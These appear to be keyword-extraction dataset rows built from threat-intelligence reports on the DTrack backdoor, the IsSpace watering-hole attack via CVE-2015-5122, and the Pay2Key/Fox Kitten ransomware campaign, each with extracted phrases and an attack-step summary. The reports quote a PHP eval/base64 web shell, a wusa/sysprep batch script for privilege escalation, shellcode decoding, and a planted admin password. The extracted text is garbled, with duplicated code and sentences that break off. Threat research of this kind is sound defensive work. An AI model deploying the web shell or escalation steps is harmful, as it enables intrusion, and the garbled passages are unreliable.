institutes, IT service providers, utility providers and telecommunications.4/5ConclusionsThe DTrack backdoor continues to be used actively by the Lazarus group. Modifications in the way the malware is packed show that Lazarus still sees DTrack as an important asset. Despite this, Lazarus has not changed the backdoor much since 2019, when it was initially discovered. When the victimology is analyzed, it becomes clear that operations have expanded to Europe and Latin America, a trend we’re seeing more and more often. ","{'phrases': ['Dtrack', 'PE', 'obfuscation', 'first', 'The second stage', 'the shellcode', 'decrypts', 'the third stage', 'the final payload', 'the encryption', 'DLL', 'explorer.exe', 'process hollowing', 'C2 servers', 'use'], 'target': 'Dtrack; PE; obfuscation; first; The second stage; the shellcode; decrypts; the third stage; the final payload; the encryption; DLL; explorer.exe; process hollowing; C2 servers; use.'}"
Flash; exploit; CVE-2015-5122; a command; control; a file; a thread; IsSpace Backdoor; C2; servers.,"[""1. The attacker compromises the aerospace company's website and adds an exploit for CVE-2015-5122. 2. When visitors go to the site, the exploit triggers and delivers the IsSpace malware. 3. IsSpace gathers system information and sends it to the C2 server 172.246.109.27. 4. The C2 server can send commands like upload/download files, execute commands, etc. 5. IsSpace uses a DLL side-loading technique to gain persistence on the infected system. 6. The malware continues communicating with the C2 server to exfiltrate data. ""]","Extract the keywords: Watering Hole Attack on Aerospace Firm Exploits CVE-2015-5122 to Install IsSpace BackdoorOn July 16, 2015, the Palo Alto Networks Unit 42 threat intelligence team discovered a watering hole attack on the website of a well-known aerospace firm. The website was compromised to launch an apparent watering-hole attack against the company’s customers. It was hosting an Adobe Flash exploit targeting one of the newly disclosed vulnerabilities from the Hacking Team data breach, CVE-2015-5122.This attack yet again showcases the opportunistic tendencies of adversary groups and bad actors. The malware deployed by this exploit has been seen in a number of targeted attacks and provides attackers with a foothold on the victim’s machine and/or network.The exploit file, movie.swf, was ZWS compressed, a tactic that has been observed to evade anti-virus programs. Once uncompressed, a binary was found to be embedded in the Flash file. Upon further analysis, this file was found to contain behavior consistent with a Trojan commonly called IsSpace. Based on its codebase and behavioral patterns, it appears that IsSpace could possibly be an evolution of the NFlog backdoor, which has previously been attributed to the adversary groups DragonOK and Moafee. Both groups are thought to be operating out of Southeast Asia, and Moafee in particular has been associated with attacks on the US defense industrial base.Exploit DetailsThe CVE-2015-5122 exploit found within the Flash file is nearly identical to the original proof of concept (POC) disclosed publically from the Hacking Team data breach. An analysis by Trend Micro covers the POC in detail. Unlike the POC mentioned in the Trend Micro report, this particular exploit file was weaponized, and, instead of loading calc.exe, a much more malicious file was loaded. As seen in Figure 1, the embedded shellcode is obfuscated using the same technique of representing bytes as integers and exponential numbers. However it appears that the adversary did not modify the POC much, as the variable name ‘calc’ remains unchanged.Figure 1. Embedded shellcode within the malicious Flash fileThese values can be converted into their byte representations using a simple Python script, truncated here for brevity.>>> import struct >>> shellcode = [2.179763029E9,286956,2.425377536E9,2.2444484E9,4.29496648E9,1094795585] >>> for s in shellcode: print repr(struct.pack(""I"", s)) 'U\x8b\xec\x81' '\xec`\x04\x00' '\x00S\x90\x90' '\x90\x90\xc7\x85' '\xd0\xfc\xff\xff' 'AAAA'>>> import struct>>> shellcode = [2.179763029E9,286956,2.425377536E9,2.2444484E9,4.29496648E9,1094795585]>>> for s in shellcode: print repr(struct.pack(""I"", s)) 'U\x8b\xec\x81''\xec`\x04\x00''\x00S\x90\x90''\x90\x90\xc7\x85''\xd0\xfc\xff\xff''AAAA'Looking at the shellcode in further detail shows a fairly simplistic instruction set. Functions are loaded dynamically, and a file is dropped to %TEMP%\Rdws.exe before being executed using the WinExec Windows API call.sz_file_path = GetTempPathA(256, file_path); *&file_path[sz_file_path] = 'swdR'; *&v6[v7 + 4] = 'exe.'; *&v6[v7 + 8] = 0; file_handle = CreateFileA(file_path, 0x40000000, 0, 0, 2, 0, 0); if ( file_handle != -1 ) { WriteFile(file_handle, data, v41, &v110, 0); CloseHandle(file_handle); WinExec(file_path, 0); }sz_file_path = GetTempPathA(256, file_path);v6 = file_path;v7 = sz_file_path;*&file_path[sz_file_path] = 'swdR';*&v6[v7 + 4] = 'exe.';*&v6[v7 + 8] = 0;file_handle = CreateFileA(file_path, 0x40000000, 0, 0, 2, 0, 0);if ( file_handle != -1 ){WriteFile(file_handle, data, v41, &v110, 0);CloseHandle(file_handle);WinExec(file_path, 0);}Returning to the Flash exploit, we discover that the dropped file is embedded within the Flash file itself as ByteArray. This binary data is loaded and decompressed with ZLIB prior to being stored in a newly allocated section of memory. The address of this binary data is then stored in the shellcode before it is executed.Figure 2. Exploit loading binary and running shellcodeAfter successful execution, a binary with the following attributes is executed on the victim’s machine.MD5 Compile TimestampMalware Details319500B2C792AEE6CD8EF8EE87D9DC1E PE32 executable (GUI) Intel 80386, for MS Windows 2014-11-14 04:35:13 UTCAs seen by the compile timestamp, this malware sample is not extremely current. The timestamp shows a compile date of November 14, 2014, which indicates that the infrastructure used by this particular sample has remained intact for quite some time, relatively speaking. Analysis of the malware indicates that this sample is highly likely to be the Trojan tool IsSpace, which shares similar code and behaviors as the NFlog tool.When comparing IsSpace to NFlog, we noticed a number of changes have been made. When initially run, the malware attempts to write log messages to ‘C:\ProgramData\log[.]txt’ indicating that this variant was intended to run on Microsoft Windows 7 or higher. However, it still maintains the capability to run on operating systems earlier than Microsoft Windows 7 if needed. IsSpace creates an event named‘MdQ0784kd’ to ensure that only a single instance of the malware is running at any given time on an infected host.To determine the flow of execution, IsSpace gathers various data about the infected host, such as administrative rights of the user, operating system version, and CPU architecture.If IsSpace determines that it is running as an administrator on a Microsoft Windows 7 system on a 32-bit platform, it will attempt to execute itself accordingly, using a side-loading technique. The malware will drop a cabinet file and batch script to the following locations:%TEMP%\FASAP.DAT %TEMP%\FASAPI.batThe batch script contains the following:@echo off ping localhost start wusa [%TEMP%]\FASAP.DAT /quiet /extract:%windir%\system32\sysprep\ start %windir%\system32\sysprep\sysprep.exe ""[CWD]\[Malware].EXE""@echo offping localhoststart wusa [%TEMP%]\FASAP.DAT /quiet /extract:%windir%\system32\sysprep\ping localhostping localhostping localhostping localhostping localhoststart %windir%\system32\sysprep\sysprep.exe ""[CWD]\[Malware].EXE""[CWD] is the directory where the malware was run from and [%TEMP%] is the full path of the %TEMP% directory.The batch script will first extract the cabinet file to the sysprep directory. The extracted file is a 32-bit DLL with the name ‘CryptBase.dll.’ The batch script continues to execute sysprep.exe after approximately 5 seconds, which will automatically load the dropped CryptBase.dll file. This DLL will execute the provided argument in a child process. This newly created process has elevated privileges as it is spawned bysysprep.exe.A similar process is taken for 64-bit systems. However, instead of dropping a batch script, a 64-bit executable along with a cabinet file containing a 64-bit version of CryptBase.dll is dropped to the following path instead:%TEMP%\FASAPI.bin %TEMP%\FASAP.DATThis executable is then run in a new process. It is responsible for unpacking the cabinet file and spawning a new instance of sysprep.exe.If the malware detects that it is running on a Windows XP host, it will attempt to check for Internet connectivity by making a HTTP request to www.microsoft.com. This is similar to characteristics observed in the NFlog backdoor, with the primary deviation being that this activity only takes place when running and control (C2) server. The initial HTTP request is made to ‘//STTip.asp.’ Note the extra leading forward slash. This is likely an unfortunate side effect of the malware expecting a subdirectory in the URI path. As this particular sample did not supply one, the extra slash is seen. An example request made can be seen below:Figure 3. Initial IsSpace beacon being sentAfter the initial beacon, IsSpace will exfiltrate victim information by making an HTTP request to ‘//SNews.asp?HostID=xx-xx-xx-xx-xx-xx’, where the HostID contains the victim’s MAC address. The POST data sent in this request is encrypted using the same four-byte XOR key of ‘\x35\x8E\x9D\x7A’ that LJLV2NKIOKP#%#Win7#%#English(US)#%#2015-07-17 07-17 09:31:57#%#Active#%#303_20140401#%#IsAdmins#%#IsSpace'Once again, the exfiltrated data is very similar to what has been used by NFlog; however with IsSpace, the victim’s user privilege level is also included, in addition to a variable of either ‘IsSpace’ or ‘IsGoogle.’ This particular variable is still under investigation by Unit 42. Additionally, we see what is likely a campaign code of ‘303_20140401’.After the successful check-in and initial exfiltration, IsSpace will then accept the following commands:Command List specified directory Delete fileResponse URI N/AIsSpace provides attackers with a foothold into the victim’s machine and/or network. While the malware itself provides limited functionality, it allows attackers to perform minimal reconnaissance and deploy Pivoting off of this primary C2 IP address using passive DNS data, we located seven domain names and two additional IP addresses that may be related to this attack. Three of the domains found used the prefix ‘ssl’ or ‘dns’ as the third level domain; this tactic is commonly used by malware authors as an evasion method.Examining the WHOIS data for the domains revealed additional intelligence on possible attribution. Specifically, the WHOIS data showed the start-vedioing[.]net to be allegedly registered to an entity in Japan:Registry Registrant ID: Registrant Name: Alta Rohde Registrant Organization: Registrant Street: tokoy Registrant Street: tokoy Registrant City: tokoy Registrant State/Province: Aomori Registrant Postal Code: 236521 Registrant Country: Japan Registrant Phone: +81.21244215 Registrant Phone Ext: Registrant Fax: Registrant Fax Ext: Registrant Email: alta.rohde@inbox[.]comAnd the anywhere-staring[.]com was found to be allegedly registered to an entity in China:Registry Registrant ID: Registrant Name: lan fei Registrant Organization:Registrant Street: tian jing lu 244 Registrant City: bei da Registrant State/Province: qing nao Registrant Postal Code: 888000 Registrant Country: China Registrant Phone: +86.13877554411 Registrant Phone Ext: Registrant Fax: Registrant Fax Ext: Registrant Email: csolyc110@163[.]comThe geographic regions indicated in the WHOIS data are consistent with campaigns previously associated with NFlog, showing that the adversaries attributed to this malware were highly likely to be operating out of Southeast Asia. IsSpace is a newer variant of the NFlog malware family, and contains many similarities in its behavior and code base. It is highly likely that adversary groups that have historically used NFlog are now using IsSpace.ConclusionAdversaries continue to exploit easily accessible vulnerabilities and readily re-use exploit code and payloads, largely due to their efficacy. This type of behavior and activity is expected to continue for the near future due to the multiple vulnerabilities disclosed by the Hacking Team data breach.As with many other previously disclosed advanced attacks, relying purely on a detection-based model for security is ineffective when IOCs are either unknown or are not readily available for ingestion. Thus, it is imperative that organizations deploy automated, behavior-based preventative measures such as Palo Alto Networks WildFire or Traps to reduce the risk of unknown attacks.Palo Alto Networks customers using WildFire are protected from this campaign. Additionally, IPS signature 14365 detects IsSpace command and control traffic inside a network.File InformationName Compile TimestampRdws.exe PE32 executable (GUI) Intel 80386, for MS Windows 2014-11-14 04:35:13 UTCC2 IP Address PE32+ executable (console) x86-64, for MS Windows 2014-05-06 13:23:38 UTC FASAP.DAT (64-bit) Microsoft Cabinet archive data, 4065 bytes, 1 file CryptBase.dll (64-bit) PE32+ executable (DLL) (GUI) x86-64, for MS Windows 2014-04-21 13:08:07 UTCFASAP.DAT Microsoft Cabinet archive data, 3870 bytes, 1 file CryptBase.dll (64-bit) PE32 executable (DLL) (GUI) Intel 80386, for MS Windows 2014-04-20 12:19:57 UTC ","{'phrases': ['Exploit', 'CVE-2015-5122', 'IsSpace', 'C2', 'server', 'commands', 'exe', 'DLL', 'the malware', 'data'], 'target': 'Exploit; CVE-2015-5122; IsSpace; C2; server; commands; exe; DLL; the malware; data.'}"
the attacker; vulnerabilities; Pay2Key; vulnerabilities; the victim; access; a second stage; the pay2key ransomware payload; the victim; credentials; compromise; additional companies; additional companies; access; infrastructure; attacks; access.,"[' 1. The attackers first gain initial access by exploiting vulnerabilities in VPN appliances like Citrix NetScaler or Fortinet. 2. They use tools like FRPC and Ngrok to create reverse proxy tunnels between compromised machines and their C2 servers. 3. The attackers install web shells on the victim networks to maintain persistent access. 4. They create local admin accounts with hardcoded passwords like ""Kharpedar123!"" for lateral movement. 5. Post-compromise, they use remote access tools like RDP to connect to compromised hosts. 6. They exfiltrate data from the victim networks. 7. In some cases, they deploy ransomware like Pay2Key to encrypt files and extort payments. 8. They threaten to leak stolen data on underground sites to pressure victims into paying. ']","Extract the keywords: Pay2KittenPay2KittenPay2Key Ransomware – A New Campaign by FoxKittenDecember 2020TLP:WHITE____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White1 | P a g ePay2KittenContentsExecutive Summary 3About Fox Kitten 5Tools Used by the Pay2Key and Their Similarities to Fox Kitten 6Tools and Offensive Techniques Categorized with MITRE ATT&CK 6Pay2Key – November 2020 8TTPs 8Attacking Vector 8Communication with Pay2Key and Data Leaks 11Previous Link to Iran 13Pay2Key – December 2020 15Updated TTPs 15Exploitation 15FRP 15Persistency 15Command and Control Communication 16Leaks 16Fox Kitten 18Technological Similarites 18Exploitation and Local User 18Tool Set Overlaps 19Command and Control 21Thematic Similarities 22Timeline 22Recommendations and Insights 24The Attackers 24The Attack Infrastructure 24Indicators of Compromise 26Hashes 26C2 Compromised Addresses 27Domains 27____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White2 | P a g ePay2KittenIntroduction Executive SummaryDuring the past four months a wave of cyber-attacks has been targeting Israeli companies. The attacks are conducted by different means and target a range of sectors. We estimate with medium to high confidence that Pay2Key is a new operation conducted by Fox Kitten, an Iranian APT group that began a new wave of attacks that entailed dozens of Israeli companies in July-August 2020.Fox Kitten Timeline2017-2019 • Fox Kitten First Campaign • Dargos: Parisite leadFebruary 2020 • ClearSky: Fox Kitten report • Citrix: New vulnerability used by the groupSeptember 2020 • CISA report about Fox KittenAugust 2020 • FBI Alert - Big F5 vulnerability is used by the groupJune 2020 • Attempts to sell victim's access in underground forums • FRPC unique tokenJuly 2020 • First attempt to exploit F5 webshell - first identifierDecember 2020 • Fox Kitten 2 - Pay2KittenFox Kitten operations during 2017-2020The Pay2Key‘s ”Modus Operndi” was to execute a Ransomware attack, potentially to mislead the victim. The attacker penetrates companies’ internal networks, encrypts servers and workstations, steals and leaks information. Also, this actor conducts “supply chain attacks” by compromising companies using accessibility or information that was obtained in breached companies. During October and November, we observed a wave of cyber-attacks on industrial and insurance companies. In November we observed a new wave of attacks on logistics companies. This figure summarizes the timeline of the Pay2Key campaign in Israel between June and December of 2020.____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White3 | P a g ePay2KittenPay2Key TimelineJune 2020 • First confirmed victim • Malware execution on 'Patient Zero' • Swascan public reportNovember 2020 • First wave of attack in • Compromising AmitalDecember 2020 • Second wave of attack (Supply chain attack) • Leaking via Twitter • Pay2Kitten ReportPay2Key operations between June 2020 – December 2020We believe that this campaign is part of the ongoing cyber confrontation between Israel and Iran, with the most recent wave of attacks causing significant damage to some of the affected companies. The entry vector mostly consists of well-known vulnerabilities covered in our Fox Kitten reports throughout the year. The attacks themselves or the abuse of successful attacks to compromise additional companies or service providers were conducted using obfuscating means, making the discovery of the attack more difficult.We assess - with a medium level of confidence - that the Pay2Key campaign is aimed to create panic in Israel. The ransomware group pay2key publicly threatened Israel, this might indicate that this operation is only a propaganda campaign to cause fear and to divert attention from Fox Kitten. That would explain the decision to leak the data instead of just demanding ransom. It can also explain why this actor chose to leak the data via public social media platforms and to include threats directed at Israel.December Darknet Leak site by Pay2Key____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White4 | P a g ePay2KittenDecember Keybase Leak site by Pay2KeyleaksAs mentioned before, we attribute the campaign to Fox Kitten (corresponding report published in February1) with a medium-high level of confidence. About Fox KittenLast November, we located a malicious file that we associated with an Iranian operation that was named “Parisite” by Dragos. In February 2020 we exposed the Fox Kitten group, an Iranian campaign that targeted companies in Israel and around the world using dozens of distinct tools. Organizational vulnerabilities are exploited to install multiple tools that will enable attackers to remotely connect to the network and establish persistence for espionage and further infection (to other companies as well). In August, the FBI published an alert regarding a new Fox Kitten capability. The group attacks a plethora of targets in various sectors around the world, including in Israel. The information that the group habitually exploits VPN vulnerabilities (such as Citrix or Fortinet) was familiar to ClearSky.On September 15th, a CISA report regarding the Fox Kitten campaign was published with an FBI alert uncovering new vulnerability exploitations by the same campaign. The report adds confirmation to the previous report published by ClearSky in February, providing additional evidence that the perpetrator was an Iranian attacker.An additional report was released on September 15th, concerning the various web shells installed on the target network (as reviewed in the Fox Kitten report). A number of public WSs utilized by the group appeared in the report. The report also included FRPC configuration – FRP is a public remote connection tool used by the group to create tunnels inside the attacked organization’s internal network.Analyzing the recent attacks conducted by the threat actor Pay2Key led us to the assess that there are overlaps between Fox Kitten to Pay2Key. In the following chapter, we examine the tool set used by Pay2Key group and compare it to Fox Kitten tool set. In the last chapter of the report, we provide a detailed comparison between the two groups based both on technical and thematic analysis.1 url© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White5 | P a g ePay2KittenTools Used by the Pay2Key and Their Similarities to Fox KittenIn the recent ‘Pay2Key’ attacks in Israel, the group used a few malicious files to achieve their goals. Moreover, we were able to identify a number of methods that overlap with the tool set of Fox Kitten.The different tools and techniques used by the group are divided in the following table into four types:1. Exploitation of vulnerabilities in VPN tools at the initial stage in the targeted organizations.2. Methods designed for privilege escalation, persistence and creating a tunnel for RDPconnections and information theft.3. Post-exploitation tools used for C2 server communication and data exfiltration, after theadversary has ensured its foothold on the target.4. Ransomware tool – Pay2Key ransomware.Tools and Offensive Techniques Categorized with MITRE ATT&CKThe following table shows the overlaps between the tools and techniques that we have found in the operation in comparison to the Fox Kitten group.Kill Chain PhaseTitleTechniques, Tools ProceduresandMITRE ATT&CKFox Kitten SimilarityReconnaissanceTechniquesRDP Brute ForceTechniquesASP SQL injectionsProceduresVulnerability scanningBrute Force - T1110 Exploit Public-Facing Scanning - T1046ExploitationTechniquesCVE-2018-13379 CVE-2019-19781 CVE-2020-5902External Remote Services - T1133ExecutionToolsPERLCommand and Scripting Interpreter - T1059InstallationToolsSCCM.exe (LanProxy) FRPC.exe (FRP Client)Scripting - T1064--Fox Kitten identified vulnerable servers Fox Kitten used 2018-2020. Moreover, the group used Citrix and Big F5 vulnerability, since February and June respectively Fox Kitten used a PERL shell script as part of their exploitation process The group used the payload of these files____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White6 | P a g ePay2KittenUser Execution: Malicious File – T1204.002TechniquesLocal WebshellLocal Web Shell – T1100TechniquesProcess InjectionToolsNgrokToolsFRPCCommand & Control (C2)TechniquesRDP connectionProcess Injection – T1055 Connection Proxy - Free tool T1090Connection Proxy - Free tool T1090Custom Command and Protocol – T1076TechniquesCommunication with C2Web Service – T1102ProceduresScheduled TaskScheduled Task/Job - T1053Actions on ObjectivesProcedurestLocal Admin / UserCreate Account – T1136ToolsPay2Key ransomwareData Encrypted for Impact - T1486Fox Kitten installed local WebShell in the victim’s network-Fox Kitten used these tools to enable machine to their C2 Fox Kitten main designated to enable the attacker used an RDP to connect to Fox Kitten created Scheduled task to gain persistency Fox Kitten created local user with Admin privileges-____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White7 | P a g ePay2KittenPay2Key – November 2020In November 2020, a threat actor named Pay2Key conducted ransomware attacks which were primarily targeted at Israeli companies. The attacker worked fast, succeeding to penetrate companies’ networks by exploiting known vulnerabilities. The attitude of the group towards the victims is exceptionally “unprofessional”, as the attacker is overly cynical, mocks his victims and in several cases di not hand over decryption keys after payment.In this chapter we analyze the toolset of Pay2Key. TTPsAttacking VectorKeyBase – First sign of the campaign infrastructureIn June Pay2Key created their KeyBase account.The first known Pay2Key ransomware executable compilation date is set to October 26th, 2020. A day later Pay2Key’s KeyBase account had a new key generated:____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White8 | P a g ePay2KittenOn this same date Swascan published the first public report detailing the Pay2Key ransomware2. The report describes attacks in Europe in which, the adversary had access to the systems a week prior to the encryption, from October 20th, 2020.The attacker attempts to manually breach organizational systems by exploiting the following vulnerabilities or vulnerable products:Initial Entry- Microsoft Exchange Server- RDP vulnerabilities and brute forcing RDP server credentials-VPN VulnerabilitiesEstablishing a Backdoor Using Reverse ProxyWhen investigating one of the attacks, we identified that the attacker utilizes publicly available tools, such as FRPC3 or Go Proxy4, to enable Reverse Proxy5 in an infected machine.The configuration file accompanying the FRPC – Reverse Proxy tool was observed in one of the files uploaded for analysis and research. The organization’s name is encoded in the file:2 url 3 github.com/fatedier/frp 4 github.com/ffay/lanproxy 5 en.wikipedia.org/wiki/Reverse_proxy____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White9 | P a g ePay2KittenMoreover, we identified a version of LanProxy written in Go language. Its purpose is the same as the FRP, this file is used to open a reverse proxy between the compromised machine to the attacker’s C2.Pay2Key RansomwareThe attacker’s methods of conducting lateral movement across the network and taking control of additional servers and services is still unclear. However, we have noted that the attacker downloads two files to the path C:\Windows\Temp\[organization-name]tmp\ after obtaining initial access to the organizational network:- The Pay2Key ransomware: Cobalt.Cobalt.exe- The ransomware’s configuration file: Config.iniThe ransomware is written in C++. Exceptionally, as other ransomware groups encrypt their ransomware files or at least obfuscate internal strings to make analysis more difficult, Pay2Key executable is unpacked and strings can be seen in clear text:The debug data has been left in the executable enabling researchers to observe the ransomware’s structure and navigate through its functionality. In several instances, the ransomware crashed or failed to decrypt the files after the victim paid the ransom.The ransom message in the readme file states that all organization’s files have been encrypted, demanding a ransom to release them, as it does in all ransomware attacks focused on extortion. If the ransom is not delivered, the files and any information they contain will be leaked online.The ransom itself ranged between seven and nine Bitcoin (with a few cases in which the attacker was negotiated down to three Bitcoin). To pressure victims into paying, Pay2Key’s leak site displays sensitive information stolen from the target organizations and makes threats of further leaks if the victims continue to delay payments.____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White10 | P a g ePay2KittenFor more information about the Pay2Key ransomware, please check CheckPoint report6.Command and Control Server ArchitecturePay2Key can operate without being connected to its C2s. the ransomware depends on the C2 servers to receive information, such as the types of files it should encrypt, the organization’s name, the ransom message’s contents, and other details.The ransomware receives the C2s’ IP addresses from its configuration file. In contrast to other ransomware that usually connect to the C2 directly, Pay2Key initially connects to a single local computer in the organizational network and designates it to use Reverse Proxy services. This computer constitutes an intersection between the target network and the C2 servers. Communication with Pay2Key and Data LeaksThe attacker registered in the Keybase.io service, which enables encrypted communications over the internet and payments with the Stellar crypto currency. The attacker notably demands payments in Bitcoin to other wallets despite being registered to a Stellar based platform.The attacker opened his account in Keybase.io on June 28th, 2020. We believe that this is the date in which the initial preparations for the attacks began. This profile was then linked to communication devices and a crypto wallet address by the attacker. At a certain stage of the process, the attacker added the address of their leak site to their profile:6 url© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White11 | P a g ePay2KittenOn November 12nd 2020, CheckPoint published their second report regarding Pay2Key7, the report describes the creation of a leak site for the Pay2Key ransomware. Ransomware leak sites are a recent popular trend, all the notoriously famous ransomware groups have one. The leak site of Pay2Key is anonymized and only accessible via TOR, but we believe it is hosted on AWS EC2 infrastructure.In the beginning of the operation the leak site was very minimalistic, and it contains only files from Israeli targets.Each of the compromised companies has a dedicated ransom note written by the Pay2Key operators. Here is an example for one of them:From the wording we can see the adversary is thoroughly inspecting the attacked asset prior to the encryption. Traditional ransomware groups do that as well in order to achieve maximum efficiency in7 url© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White12 | P a g ePay2Kittenthe operation so that the target would have to pay the ransom in order to restore normal operations. However, at the end of the message we can see that the adversary continued to control the network even after the encryption was completed and the ransom was paid. Previous Link to IranCheck Point published an additional report following the attacker’s possible identity on November 12th . Aided by Whitestream, Check Point surveilled the Bitcoin wallets that received ransom payments from victims. According to their joint research efforts, the currency was transferred to a mid-point wallet from which it was transferred again to a wallet associated with an Iranian crypto exchange named Excoino:The research report notes that in order to register with the Excoino exchange, a user must provide an Iranian phone number and Iranian identification means. This supports the assumption that the attacker (or multiple attackers) possesses an Iranian means of identification. CheckPoint state this as sufficient ground to attribute the attacks to Iran and identify the attackers as an Iranian attack group.In our research, we identified that the name and image of the profile lead to a cryptography project named “EOSIO UTXO”. This project is also named Pay2Key and displays an identical profile image:____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White13 | P a g ePay2KittenThe purpose of this project is to manufacture “smart contracts” based on the EOS crypto currency Blockchain.____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White14 | P a g ePay2KittenPay2Key – December 2020Amital is an Israeli software company that was breached by this threat actor8. Leveraging Amital’s network with a supply chain attack method, Pay2Key spread to over 40 firms from Israel.The attacker used the same ransomware file from November and added several new tools to his tool set. In this chapter, we will examine the current attack by Pay2Key. Updated TTPsExploitation The analysis of the infrastructure of Habana identified a vulnerable Fortinet server that was breached and its credentials were leaked to an underground forum. This server was vulnerable to Fortinet SSL VPN (CVE-2018-13379)9.We assess that this server was hacked by the threat actor using this exploit.FRP By monitoring this threat actor, we identified an FRPC tool, sharing the same IP address that was part of the December infrastructure according to the INDC alert and we attributed it to Fox Kitten. This file was deployed to the victim’s network via another tool packed with MPRESS Packer. The deployed file “svchost.exe” is a compiled version of the FRP Client tool.As in the previous FRPC file, the organization’s name is written:Persistency This adversary created an account on the victim’s compromised asset with admin privileges. The attacker used the following credentials:Username: DefaultAccounts$Password: Kharpedar123!8 url cyberattack-continues-1.9375486 9 url© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White15 | P a g ePay2KittenCommand and Control Communication In the Sawnscan report about Pay2Key10, the company presented dllhost.exe as one of the applications used by the attack to be able to access the compromised asset. This file is a version of Ngrok software that was hidden in the victim’s computer since the attacker hacked it.LeaksIn Mid December 2020, Pay2Key changed the appearance of their leak site. The leak site now has a background image with the map of Israel. This was most likely done after the public announcement that Intel Habana Labs were encrypted by Pay2Key. Habana Labs is an Israeli start-up that was acquired by Intel.11The current leak site has all the “official” ways Pay2Key communicate, mail, KeyBase and Twitter.10 url 11 Source: Swascan report____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White16 | P a g ePay2KittenUnlike the first wave, the Pay2Key attacker contacts its followers and the Israeli media via Twitter account instead of a telegram channel. This time, the threat actor focuses specifically on Israeli victims, as is presented in the next picture.____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White17 | P a g ePay2KittenFox KittenIn our analysis, we identified two types of similarities between Fox Kitten group and the recent attacks executed by Pay2Key: Technological similarities and thematic similarities. In this chapter, we present an overview of these similarities and the overlaps between Pay2Key and Fox Kitten. Technological SimilaritesExploitation and Local User In the forensic research we conducted about the Fox Kitten campaign, we identified three main vulnerabilities that were exploited among the victims. Following this, further research by CISA, which is associated with the United States Department of Homeland Security, has revealed two additional vulnerabilities which are being used by the group12. We have witnessed attempts to exploit the CITRIX vulnerability in Israel since February 2020 and the Big F5 vulnerability since June 2020 (based on information we received from our partners). The following is the summary of vulnerabilities we attribute with high probability of being potentially exploited by the group:• CVE-2019-11510 Pulse Secure• CVE-2018-13379 Fortinet FortiOS• CVE-2018-1579 Palo Alto Networks VPN• CVE-2019-19781 Citrix NetScaler• CVE-2020-5902 BIG-IP (F5 Networks)Additionally, a password was presented as an indicator on the Israel National Cyber Directorate's report:Kharpedar123!This password contains of two Persian words connected to each other. Khar meaning ""donkey"" and Pedar meaning “father”. This is not a common expression in Persian, and it is used as a way of cursing. A similar expression in Persian is pedar-e sag (father's dog) which is usually used when referring to the US and used for mockery purposes.In our investigation, we identified utilization of this password, as mentioned before, in the victims’ network. This name was used as a password for a local user with high privileges, that the actor created in the victim’s machine. This method was executed by both Fox Kitten and Pay2Key, sharing the same password for both.12 url Based_Threat_Actor_Exploits_VPN_Vulnerabilities_S508C.pdf url© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White18 | P a g ePay2KittenRIFT's report from July revealed that in the F5 vulnerability there was a use of a WebShell with a reused password from the exploit of CITRIX vulnerability13, which corresponds to the dates where the group exploited this vulnerability14:<?php @eval(base64_decode($_POST['citrix@kharpedar']));?>This file has also been reported in the CISA report about the WebShell use by this group. This file was uploaded to VT from the US with three artifacts used by the threat actor to conduct this exploitation:As can be seen, this is a reused web shell from Citrix used to exploit CVE-2019-19781 (Citrix NetScaler). In the Fox Kitten report, we reported three main vulnerabilities the group used, and by February 2020, we observed an exploitation of CVE-2019-19781 as well. In July, the FBI also reported15 the exploitation of vulnerability in F5 networking devices. Therefore, we attribute the password “Kharpedar” to both Citrix and F5 exploitations, as well as the Pay2Key attack.Tool Set Overlaps Both Fox Kitten and Pay2Key used two reverse proxy/SSH tools. In February, we reported that we observed Fox Kitten utilize FRPC and Ngrok to open the tunnel between the compromised machines to the C2.As mentioned before, Pay2Key also used Ngrok (according to swascan16). In our analysis, we also identified an FRPC used by Pay2Key, which goes by the name dllhost.dll. This file shares the same token, as can be seen from the FRPC Token sub-chapter below. The malware that was used to deploy the FRPC tool to the compromised asset is named “svchost.exe”. According to Intezer analysis17, This file (by Pay2Key) shares 97.47% of its genes with the same file name that Fox Kitten used in CISA report.Based on this file, we identified a PERL18 reverse shell used by Fox Kitten, which also communicated with Amazon hosted C2. The same Amazon server was observed serving the FRPC.EXE that was used in Pay2Key attacks.13 url intelligence / 14 url intelligence/ 15 url 16 url 17 url url 18 url© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White19 | P a g ePay2KittenFRPC TokenIn the first Fox Kitten report, we exposed the utilization of Fast Reverse Proxy (FRP) as one of the methods Fox Kitten used during the three years of their operation. One of the tools they used in February was FRPC19, an open-source tool that enables the exposure of a local server behind a NAT or a firewall to the internet, based on the reverse proxy method.In CISA report about Fox Kitten’s WebShell, they also 